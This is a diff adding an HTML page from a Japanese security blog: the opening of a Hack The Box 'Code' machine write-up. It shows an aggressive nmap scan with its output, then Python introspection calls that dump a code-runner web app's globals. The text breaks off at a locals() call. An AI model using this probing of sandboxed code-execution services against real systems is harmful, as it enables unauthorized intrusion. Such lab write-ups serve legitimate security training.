@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html lang="ja"><script src="/starknote/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=starknote/livereload" data-no-instant defer></script><meta charset="utf-8"><meta name="generator" content="Hugo 0.164.0"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark">
+<link rel="icon" href="/starknote/favicon.ico" type="image/x-icon"><title>HTB Code&nbsp;&ndash;&nbsp;しゅたるくの備忘録</title><link rel="stylesheet" href="/starknote/css/core.min.4bf2d65b435be9d2cb342733d6e0d0fe0e915aa1b4daa6665d4eea2be6c09a9d949eb8fb850654c5033c80dda50d8491.css" integrity="sha384-S/LWW0Nb6dLLNCcz1uDQ/g6RWqG02qZmXU7qK&#43;bAmp2Unrj7hQZUxQM8gN2lDYSR"><meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="HTB Code" /><meta name="twitter:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png" /><meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Code" />
+<meta property="og:site_name" content="しゅたるくの備忘録" /><meta property="og:image" content="https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/new-year-ctf-2025/cover.png" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/starknote/"><span class="site name">しゅたるくの備忘録</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/starknote/categories/">カテゴリ</a><a class="nav item" href="/starknote/tags/">タグ</a><a class="nav item" href="/starknote/about/">About</a><a class="nav item" href=""></a></nav></div></span></div></section><section id="content">
+<div id="top" class="article-container"><section class="article header">
+    <h1 class="article title">HTB Code</h1><p class="article date">Jun 01, 2025</p></section><article class="article markdown-body"><p>HTB Codeのメモ．</p>
+<h2 id="user-flag">User Flag</h2>
+<pre tabindex="0"><code>nmap -Pn -T4 -sV -sC -A 10.10.11.62
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-04 08:15 JST
+Nmap scan report for 10.10.11.62
+Host is up (0.32s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
+|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
+|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
+5000/tcp open  http    Gunicorn 20.0.4
+|_http-title: Python Code Editor
+Aggressive OS guesses: Linux 4.15 - 5.8 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 5900/tcp)
+HOP RTT       ADDRESS
+1   103.91 ms 10.10.16.1
+2   105.45 ms 10.10.11.62
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 74.00 seconds   
+</code></pre><p><code>http://10.10.11.62:5000/</code>へアクセスすると，pythonコード実行Webアプリ．</p>
+<p>一部の単語はフィルタリングされている．</p>
+<p>グローバル変数を表示．</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">globals</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">---</span><span class="n">output</span><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s1">&#39;__name__&#39;</span><span class="p">:</span> <span class="s1">&#39;app&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">:</span> <span class="kc">None</span><span class="p">,</span> <span class="s1">&#39;__package__&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;__loader__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">_frozen_importlib_external</span><span class="o">.</span><span class="n">SourceFileLoader</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7f97bedc9430</span><span class="o">&gt;</span><span class="p">,</span> <span class="s1">&#39;__spec__&#39;</span><span class="p">:</span> <span class="n">ModuleSpec</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;app&#39;</span><span class="p">,</span> <span class="n">loader</span><span class="o">=&lt;</span><span class="n">_frozen_importlib_external</span><span class="o">.</span><span class="n">SourceFileLoader</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7f97bedc9430</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">origin</span><span class="o">=</span><span class="s1">&#39;/home/app-production/app/app.py&#39;</span><span class="p">),</span> <span class="s1">&#39;__file__&#39;</span><span class="p">:</span> <span class="s1">&#39;/home/app-production/app/app.py&#39;</span><span class="p">,</span> <span class="s1">&#39;__cached__&#39;</span><span class="p">:</span> <span class="s1">&#39;/home/app-production/app/__pycache__/app.cpython-38.pyc&#39;</span><span class="p">,</span> <span class="s1">&#39;__builtins__&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;__name__&#39;</span><span class="p">:</span> <span class="s1">&#39;builtins&#39;</span><span class="p">,</span> <span class="s1">&#39;__doc__&#39;</span><span class="p">:</span> <span class="s2">&#34;Built-in functions, exceptions, and other objects.</span><span class="se">\n\n</span><span class="s2">Noteworthy: None is the `nil&#39; object; Ellipsis represents `...&#39; in slices.&#34;</span><span class="p">,</span> <span class="s1">&#39;__package__&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;__loader__&#39;</span><span class="p">:</span> <span class="o">&lt;</span><span class="k">class</span> <span class="err">&#39;</span><span class="nc">_frozen_importlib</span><span class="o">.</span><span class="n">BuiltinImporter</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">__spec__</span><span class="s1">&#39;: ModuleSpec(name=&#39;</span><span class="n">builtins</span><span class="s1">&#39;, loader=&lt;class &#39;</span><span class="n">_frozen_importlib</span><span class="o">.</span><span class="n">BuiltinImporter</span><span class="s1">&#39;&gt;), &#39;</span><span class="n">__build_class__</span><span class="s1">&#39;: &lt;built-in function __build_class__&gt;, &#39;</span><span class="nb">__import__</span><span class="s1">&#39;: &lt;built-in function __import__&gt;, &#39;</span><span class="nb">abs</span><span class="s1">&#39;: &lt;built-in function abs&gt;, &#39;</span><span class="nb">all</span><span class="s1">&#39;: &lt;built-in function all&gt;, &#39;</span><span class="nb">any</span><span class="s1">&#39;: &lt;built-in function any&gt;, &#39;</span><span class="n">ascii</span><span class="s1">&#39;: &lt;built-in function ascii&gt;, &#39;</span><span class="nb">bin</span><span class="s1">&#39;: &lt;built-in function bin&gt;, &#39;</span><span class="n">breakpoint</span><span class="s1">&#39;: &lt;built-in function breakpoint&gt;, &#39;</span><span class="n">callable</span><span class="s1">&#39;: &lt;built-in function callable&gt;, &#39;</span><span class="nb">chr</span><span class="s1">&#39;: &lt;built-in function chr&gt;, &#39;</span><span class="nb">compile</span><span class="s1">&#39;: &lt;built-in function compile&gt;, &#39;</span><span class="nb">delattr</span><span class="s1">&#39;: &lt;built-in function delattr&gt;, &#39;</span><span class="nb">dir</span><span class="s1">&#39;: &lt;built-in function dir&gt;, &#39;</span><span class="nb">divmod</span><span class="s1">&#39;: &lt;built-in function divmod&gt;, &#39;</span><span class="nb">eval</span><span class="s1">&#39;: &lt;built-in function eval&gt;, &#39;</span><span class="n">exec</span><span class="s1">&#39;: &lt;built-in function exec&gt;, &#39;</span><span class="nb">format</span><span class="s1">&#39;: &lt;built-in function format&gt;, &#39;</span><span class="nb">getattr</span><span class="s1">&#39;: &lt;built-in function getattr&gt;, &#39;</span><span class="nb">globals</span><span class="s1">&#39;: &lt;built-in function globals&gt;, &#39;</span><span class="nb">hasattr</span><span class="s1">&#39;: &lt;built-in function hasattr&gt;, &#39;</span><span class="nb">hash</span><span class="s1">&#39;: &lt;built-in function hash&gt;, &#39;</span><span class="nb">hex</span><span class="s1">&#39;: &lt;built-in function hex&gt;, &#39;</span><span class="nb">id</span><span class="s1">&#39;: &lt;built-in function id&gt;, &#39;</span><span class="nb">input</span><span class="s1">&#39;: &lt;built-in function input&gt;, &#39;</span><span class="nb">isinstance</span><span class="s1">&#39;: &lt;built-in function isinstance&gt;, &#39;</span><span class="nb">issubclass</span><span class="s1">&#39;: &lt;built-in function issubclass&gt;, &#39;</span><span class="nb">iter</span><span class="s1">&#39;: &lt;built-in function iter&gt;, &#39;</span><span class="nb">len</span><span class="s1">&#39;: &lt;built-in function len&gt;, &#39;</span><span class="nb">locals</span><span class="s1">&#39;: &lt;built-in function locals&gt;, &#39;</span><span class="nb">max</span><span class="s1">&#39;: &lt;built-in function max&gt;, &#39;</span><span class="nb">min</span><span class="s1">&#39;: &lt;built-in function min&gt;, &#39;</span><span class="nb">next</span><span class="s1">&#39;: &lt;built-in function next&gt;, &#39;</span><span class="nb">oct</span><span class="s1">&#39;: &lt;built-in function oct&gt;, &#39;</span><span class="nb">ord</span><span class="s1">&#39;: &lt;built-in function ord&gt;, &#39;</span><span class="nb">pow</span><span class="s1">&#39;: &lt;built-in function pow&gt;, &#39;</span><span class="nb">print</span><span class="s1">&#39;: &lt;built-in function print&gt;, &#39;</span><span class="nb">repr</span><span class="s1">&#39;: &lt;built-in function repr&gt;, &#39;</span><span class="nb">round</span><span class="s1">&#39;: &lt;built-in function round&gt;, &#39;</span><span class="nb">setattr</span><span class="s1">&#39;: &lt;built-in function setattr&gt;, &#39;</span><span class="nb">sorted</span><span class="s1">&#39;: &lt;built-in function sorted&gt;, &#39;</span><span class="nb">sum</span><span class="s1">&#39;: &lt;built-in function sum&gt;, &#39;</span><span class="nb">vars</span><span class="s1">&#39;: &lt;built-in function vars&gt;, &#39;</span><span class="kc">None</span><span class="s1">&#39;: None, &#39;</span><span class="bp">Ellipsis</span><span class="s1">&#39;: Ellipsis, &#39;</span><span class="bp">NotImplemented</span><span class="s1">&#39;: NotImplemented, &#39;</span><span class="kc">False</span><span class="s1">&#39;: False, &#39;</span><span class="kc">True</span><span class="s1">&#39;: True, &#39;</span><span class="nb">bool</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">bool</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">memoryview</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">memoryview</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">bytearray</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">bytearray</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">bytes</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">bytes</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">classmethod</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">classmethod</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">complex</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">complex</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">dict</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">dict</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">enumerate</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">enumerate</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">filter</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">filter</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">float</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">float</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">frozenset</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">frozenset</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">property</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">property</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">int</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">int</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">list</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">list</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">map</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">map</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">object</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">object</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">range</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">range</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">reversed</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">reversed</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">set</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">set</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">slice</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">slice</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">staticmethod</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">staticmethod</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">str</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">str</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">super</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">super</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">tuple</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">tuple</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">type</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">type</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">zip</span><span class="s1">&#39;: &lt;class &#39;</span><span class="nb">zip</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">__debug__</span><span class="s1">&#39;: True, &#39;</span><span class="ne">BaseException</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">BaseException</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">Exception</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">Exception</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">TypeError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">TypeError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">StopAsyncIteration</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">StopAsyncIteration</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">StopIteration</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">StopIteration</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">GeneratorExit</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">GeneratorExit</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">SystemExit</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">SystemExit</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">KeyboardInterrupt</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">KeyboardInterrupt</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ImportError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ImportError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ModuleNotFoundError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ModuleNotFoundError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">OSError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">OSError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">EnvironmentError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">OSError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">IOError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">OSError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">EOFError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">EOFError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">RuntimeError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">RuntimeError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">RecursionError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">RecursionError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">NotImplementedError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">NotImplementedError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">NameError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">NameError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">UnboundLocalError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">UnboundLocalError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">AttributeError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">AttributeError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">SyntaxError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">SyntaxError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">IndentationError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">IndentationError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">TabError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">TabError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">LookupError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">LookupError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">IndexError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">IndexError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">KeyError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">KeyError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ValueError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ValueError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">UnicodeError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">UnicodeError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">UnicodeEncodeError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">UnicodeEncodeError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">UnicodeDecodeError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">UnicodeDecodeError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">UnicodeTranslateError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">UnicodeTranslateError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">AssertionError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">AssertionError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ArithmeticError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ArithmeticError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">FloatingPointError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">FloatingPointError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">OverflowError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">OverflowError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ZeroDivisionError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ZeroDivisionError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">SystemError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">SystemError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ReferenceError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ReferenceError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">MemoryError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">MemoryError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">BufferError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">BufferError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">Warning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">Warning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">UserWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">UserWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">DeprecationWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">DeprecationWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">PendingDeprecationWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">PendingDeprecationWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">SyntaxWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">SyntaxWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">RuntimeWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">RuntimeWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">FutureWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">FutureWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ImportWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ImportWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">UnicodeWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">UnicodeWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">BytesWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">BytesWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ResourceWarning</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ResourceWarning</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ConnectionError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ConnectionError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">BlockingIOError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">BlockingIOError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">BrokenPipeError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">BrokenPipeError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ChildProcessError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ChildProcessError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ConnectionAbortedError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ConnectionAbortedError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ConnectionRefusedError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ConnectionRefusedError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ConnectionResetError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ConnectionResetError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">FileExistsError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">FileExistsError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">FileNotFoundError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">FileNotFoundError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">IsADirectoryError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">IsADirectoryError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">NotADirectoryError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">NotADirectoryError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">InterruptedError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">InterruptedError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">PermissionError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">PermissionError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">ProcessLookupError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">ProcessLookupError</span><span class="s1">&#39;&gt;, &#39;</span><span class="ne">TimeoutError</span><span class="s1">&#39;: &lt;class &#39;</span><span class="ne">TimeoutError</span><span class="s1">&#39;&gt;, &#39;</span><span class="nb">open</span><span class="s1">&#39;: &lt;built-in function open&gt;, &#39;</span><span class="n">quit</span><span class="s1">&#39;: Use quit() or Ctrl-D (i.e. EOF) to exit, &#39;</span><span class="n">exit</span><span class="s1">&#39;: Use exit() or Ctrl-D (i.e. EOF) to exit, &#39;</span><span class="n">copyright</span><span class="s1">&#39;: Copyright (c) 2001-2021 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., &#39;</span><span class="n">credits</span><span class="s1">&#39;: Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., &#39;</span><span class="n">license</span><span class="s1">&#39;: Type license() to see the full license text, &#39;</span><span class="n">help</span><span class="s1">&#39;: Type help() for interactive help, or help(object) for help about object.}, &#39;</span><span class="n">Flask</span><span class="s1">&#39;: &lt;class &#39;</span><span class="n">flask</span><span class="o">.</span><span class="n">app</span><span class="o">.</span><span class="n">Flask</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">render_template</span><span class="s1">&#39;: &lt;function render_template at 0x7f97be785ee0&gt;, &#39;</span><span class="n">render_template_string</span><span class="s1">&#39;: &lt;function render_template_string at 0x7f97be785f70&gt;, &#39;</span><span class="n">request</span><span class="s1">&#39;: &lt;Request &#39;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.62</span><span class="p">:</span><span class="mi">5000</span><span class="o">/</span><span class="n">run_code</span><span class="s1">&#39; [POST]&gt;, &#39;</span><span class="n">jsonify</span><span class="s1">&#39;: &lt;function jsonify at 0x7f97bea31c10&gt;, &#39;</span><span class="n">redirect</span><span class="s1">&#39;: &lt;function redirect at 0x7f97be89a3a0&gt;, &#39;</span><span class="n">url_for</span><span class="s1">&#39;: &lt;function url_for at 0x7f97be89a310&gt;, &#39;</span><span class="n">session</span><span class="s1">&#39;: &lt;SecureCookieSession </span><span class="si">{}</span><span class="s1">&gt;, &#39;</span><span class="n">flash</span><span class="s1">&#39;: &lt;function flash at 0x7f97be89a550&gt;, &#39;</span><span class="n">SQLAlchemy</span><span class="s1">&#39;: &lt;class &#39;</span><span class="n">flask_sqlalchemy</span><span class="o">.</span><span class="n">extension</span><span class="o">.</span><span class="n">SQLAlchemy</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">sys</span><span class="s1">&#39;: &lt;module &#39;</span><span class="n">sys</span><span class="s1">&#39; (built-in)&gt;, &#39;</span><span class="n">io</span><span class="s1">&#39;: &lt;module &#39;</span><span class="n">io</span><span class="s1">&#39; from &#39;</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.8</span><span class="o">/</span><span class="n">io</span><span class="o">.</span><span class="n">py</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">os</span><span class="s1">&#39;: &lt;module &#39;</span><span class="n">os</span><span class="s1">&#39; from &#39;</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.8</span><span class="o">/</span><span class="n">os</span><span class="o">.</span><span class="n">py</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">hashlib</span><span class="s1">&#39;: &lt;module &#39;</span><span class="n">hashlib</span><span class="s1">&#39; from &#39;</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.8</span><span class="o">/</span><span class="n">hashlib</span><span class="o">.</span><span class="n">py</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">app</span><span class="s1">&#39;: &lt;Flask &#39;</span><span class="n">app</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">db</span><span class="s1">&#39;: &lt;SQLAlchemy sqlite:////home/app-production/app/instance/database.db&gt;, &#39;</span><span class="n">User</span><span class="s1">&#39;: &lt;class &#39;</span><span class="n">app</span><span class="o">.</span><span class="n">User</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">Code</span><span class="s1">&#39;: &lt;class &#39;</span><span class="n">app</span><span class="o">.</span><span class="n">Code</span><span class="s1">&#39;&gt;, &#39;</span><span class="n">index</span><span class="s1">&#39;: &lt;function index at 0x7f97bd7d38b0&gt;, &#39;</span><span class="n">register</span><span class="s1">&#39;: &lt;function register at 0x7f97bd7d3b80&gt;, &#39;</span><span class="n">login</span><span class="s1">&#39;: &lt;function login at 0x7f97bd7d3c10&gt;, &#39;</span><span class="n">logout</span><span class="s1">&#39;: &lt;function logout at 0x7f97bd7d3ca0&gt;, &#39;</span><span class="n">run_code</span><span class="s1">&#39;: &lt;function run_code at 0x7f97bd7d3e50&gt;, &#39;</span><span class="n">load_code</span><span class="s1">&#39;: &lt;function load_code at 0x7f97bd651040&gt;, &#39;</span><span class="n">save_code</span><span class="s1">&#39;: &lt;function save_code at 0x7f97bd6511f0&gt;, &#39;</span><span class="n">codes</span><span class="s1">&#39;: &lt;function codes at 0x7f97bd6513a0&gt;, &#39;</span><span class="n">about</span><span class="s1">&#39;: &lt;function about at 0x7f97bd651550&gt;}</span>
+</span></span></code></pre></div><p>ローカル変数を表示．</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="nb">locals</span><span class="p">())</span>
